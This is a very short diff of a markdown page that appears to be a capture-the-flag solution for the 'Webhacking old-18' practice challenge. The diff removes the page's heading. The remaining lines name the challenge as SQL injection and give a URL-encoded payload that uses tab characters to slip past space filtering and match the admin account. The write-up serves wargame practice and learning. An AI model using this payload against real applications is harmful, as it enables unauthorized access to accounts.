@@ -3,7 +3,7 @@ layout: default
 title: old-18
 ---
 
-# Webhacking old-18 Solution
+
 
 this challange is SQL injection.
 this is the payload: `2%09or%09id%09LIKE%09%27admin%27%09--%09`
